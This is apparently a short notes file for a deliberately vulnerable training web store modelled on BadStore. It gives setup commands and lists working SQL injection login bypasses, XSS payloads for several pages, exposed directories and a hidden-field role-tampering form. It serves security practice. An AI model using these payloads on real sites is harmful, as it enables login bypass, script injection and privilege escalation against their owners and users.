npm i
Front end- npm run dev
backend - npm run start

SQL Injection:
Login to My Account - 'or 1=1 or' admin' or 1=1# , admin' or '1'='1 
supplier login - admin' or 1=1# 

Cross-site Scripting (XSS):
Password Reset - </h2><script>alert(1);</script><h2> 
Supplier Upload Portal - <img src=x onerror=alert(1);> 
Guestbook -  </h2><script>alert(1);</script><h2> 
Publicly Available Directories :
robot.txt file
/supplier directory

Web Parameter Tampering:
?action=admin
<INPUT TYPE="hidden" NAME="role" VALUE="U"><INPUT TYPE="submit"
METHOD="POST" ACTION="http://{your ip address}/cgi-bin/badstore.cgi?action=register"
